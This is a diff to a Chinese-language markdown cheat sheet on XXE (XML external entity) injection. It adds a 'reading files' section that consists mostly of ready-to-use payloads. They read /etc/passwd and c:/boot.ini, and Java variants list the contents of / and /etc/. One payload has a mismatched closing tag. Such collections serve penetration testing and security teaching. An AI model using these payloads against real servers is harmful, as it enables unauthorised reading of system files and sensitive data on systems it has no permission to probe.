@@ -1,6 +1,6 @@
 # XXE漏洞
 
-1.检测漏洞
+检测漏洞
 
 ```xml
 <!--?xml version="1.0" ?-->
@@ -12,3 +12,56 @@
 ```
 
 当 XML 解析器解析外部实体时，结果应在 firstName 中包含John，在 lastName 中包含Doe
+
+## 读取文件
+
+1.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>1</storeId>
+</stockCheck3>
+```
+
+2.
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+```
+
+3.
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+```
+
+4.
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+```
+
+SYSTEM 和 PUBLIC 可以互换，例如：
+```xml
+<!ENTITY % xxe PUBLIC "Random Text" "URL">
+<!ENTITY xxe PUBLIC "Any TEXT" "URL">
+```
+
+在基于Java的应用程序中，可以通过 XXE列出目录的内容，其有效负载如下:
+```xml
+<!-- Root / -->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>
+
+<!-- /etc/ -->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
+```
